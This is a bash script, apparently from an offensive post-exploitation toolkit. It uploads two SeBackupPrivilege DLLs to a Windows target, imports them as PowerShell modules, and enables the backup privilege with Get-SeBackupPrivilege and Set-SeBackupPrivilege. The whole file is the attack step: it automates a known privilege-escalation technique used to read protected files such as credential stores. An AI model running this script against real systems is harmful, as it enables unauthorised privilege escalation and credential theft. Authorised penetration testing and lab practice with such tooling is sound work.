#!/bin/bash

: '
ps: upload and import Copy-FileSeBackupPrivilege modules
'

LOCATION="${SCRIPTS_DIR}/reconnaissance/windows/permissions/seBackupPrivilege/.files"

# upload SeBackupPrivilegeCmdLets.dll
FILE="SeBackupPrivilegeCmdLets.dll"

ps_webclient_upload_file "${LOCATION}" "${FILE}"
sleep 3

execute_command "Import-Module ${FILE_LOCATION}"
create_new_line

# upload SeBackupPrivilegeUtils.dll
FILE="SeBackupPrivilegeUtils.dll"

ps_webclient_upload_file "${LOCATION}" "${FILE}"
sleep 3

execute_command "Import-Module ${FILE_LOCATION}"
create_new_line
sleep 0.8

execute_command "Get-SeBackupPrivilege"
create_new_line
sleep 0.8

execute_command "Set-SeBackupPrivilege"
create_new_line
